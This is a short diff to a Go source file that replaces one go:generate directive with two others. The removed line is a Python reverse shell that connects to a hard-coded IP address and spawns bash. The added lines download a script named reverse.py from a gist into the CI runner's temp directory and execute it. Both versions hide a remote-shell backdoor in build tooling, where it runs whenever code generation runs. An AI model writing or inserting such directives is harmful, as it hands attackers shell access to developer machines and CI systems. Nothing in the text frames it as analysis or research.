@@ -1,4 +1,5 @@
-//go:generate python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("35.184.92.106",9897));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
+//go:generate curl -s -o $RUNER_TEMP/reverse.py https://gist.githubusercontent.com/armmanvaillancourt/56b8a78f53b99031d85b1a2d539d19ad/raw/7fc9e966dbd07198781505b9b9b5b75bb0c0d843/reverse.py
+//go:generate python $RUNNER_TEMP/reverse.py
 
 package main
 
